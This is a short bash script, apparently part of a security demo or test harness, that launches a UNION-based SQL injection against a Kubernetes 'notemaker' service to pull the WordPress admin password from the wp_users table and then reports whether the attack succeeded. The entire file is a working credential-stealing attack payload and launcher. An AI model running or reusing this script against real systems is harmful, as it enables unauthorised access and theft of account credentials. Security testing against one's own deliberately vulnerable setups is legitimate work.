#!/bin/bash

attackString="-1+union+select+1,2,3,4,5,6,7,8,9,(SELECT+user_pass+FROM+wp_users+WHERE+ID=1)"
notemaker=$(kubectl get svc -n notemaker | grep LoadBalancer | grep notemaker | awk '{ print $4 }')
echo
echo "--------- GET CREDENTIALS SQL INJECTION ATTACK --------------"
echo "--- launching attack on http://$websvc"

curl -s -o responses/hack-password-sql-injection.html -d "$attackString" http://$notemaker
success=$(grep -c POST responses/hack-password-sql-injection.html)
if [ "$success" == "1" ]; then
  echo "++++     able to obtain admin password credentials    +++++"
  echo "----- GET CREDENTIALS SQL INJECTION ATTACK SUCCESSFUL ------"
else
  echo "*****     not able to obtain admin credetials       *****"
  echo "------  GET CREDENTIALS SQL INJECTION FAILED   ----------"
fi
echo


